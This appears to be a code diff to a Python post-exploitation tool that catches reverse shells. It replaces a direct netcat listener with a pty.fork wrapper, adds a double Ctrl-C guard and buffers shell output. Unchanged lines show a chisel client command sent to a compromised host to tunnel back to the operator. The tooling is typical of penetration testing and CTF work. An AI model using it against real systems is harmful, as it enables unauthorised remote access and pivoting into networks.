@@ -14,7 +14,7 @@ import paramiko
 import base64
 import select
 import argparse
-
+import signal
 
 try:
     import SocketServer
@@ -35,6 +35,7 @@ class ShellListener:
         self.features = set()
         self.shell_ready = False 
         self.os = None # we need a way to find the OS here
+        self.raw_output = b""
 
     def startBackground(self):
         self.listen_thread = threading.Thread(target=self.start)
@@ -95,6 +96,8 @@ class ShellListener:
                         self.shell_ready = True
                         if self.verbose:
                             print("RECV first prompt")
+                    else:
+                        self.raw_output += data
 
             print("[-] Disconnected")
             self.connection = None
@@ -285,7 +288,6 @@ class ParamikoTunnelServer(SocketServer.ThreadingTCPServer):
     daemon_threads = True
     allow_reuse_address = True
 
-
 class ParamikoTunnel:
     def __init__(self, shell, ports):
         self.shell = shell
@@ -426,7 +428,22 @@ def generate_payload(payload_type, local_address, port, index=None, **kwargs):
     return payload
 
 def spawn_listener(port):
-    pty.spawn(["nc", "-lvvp", str(port)])
+    signal.signal(signal.SIGINT, on_ctrl_c)
+    orig_stdin = os.dup(0)
+    pid, fd = pty.fork()
+    if pid == 0:
+        os.dup2(orig_stdin, 0)
+        x = os.execvp("nc", ["nc", "-lvvp", str(port)])
+    else:
+        try:
+            while True:
+                data = os.read(fd, 1024)
+                if not data:
+                    break
+                sys.stdout.buffer.write(data)
+                sys.stdout.flush()
+        except OSError as e:
+            print("[!] OSError:", str(e))
 
 def wait_for_connection(listener, timeout=None, prompt=True):
     start = time.time()
@@ -494,13 +511,20 @@ def create_tunnel(shell, ports: list):
         shell.sendline(f"/tmp/chisel64 client --max-retry-count 1 {ipAddress}:{chiselPort} {ports} 2>&1 >/dev/null &")
         return t
     elif isinstance(shell, paramiko.SSHClient):
-
         paramiko_tunnel = ParamikoTunnel(shell, ports)
         paramiko_tunnel.start_background()
         return paramiko_tunnel
 
-        # TODO: https://github.com/paramiko/paramiko/blob/88f35a537428e430f7f26eee8026715e357b55d6/demos/forward.py#L103
-        pass
+def on_ctrl_c(*args):
+    global ctrl_c_pressed
+    now = time.time()
+    last_pressed = globals().get("ctrl_c_pressed", None)
+    if not last_pressed or (now - last_pressed) > 1.5:
+        print("[!] CTRL-C pressed. Press again if you really want to interrupt")
+    else:
+        sys.exit(0)
+
+    ctrl_c_pressed = now
 
 if __name__ == "__main__":
 
@@ -544,4 +568,4 @@ if __name__ == "__main__":
         print("xhost +targetip")
         print("Xnest :1")
     else:
-        pty.spawn(["nc", "-lvvp", str(listen_port)])
+        spawn_listener(listen_port)
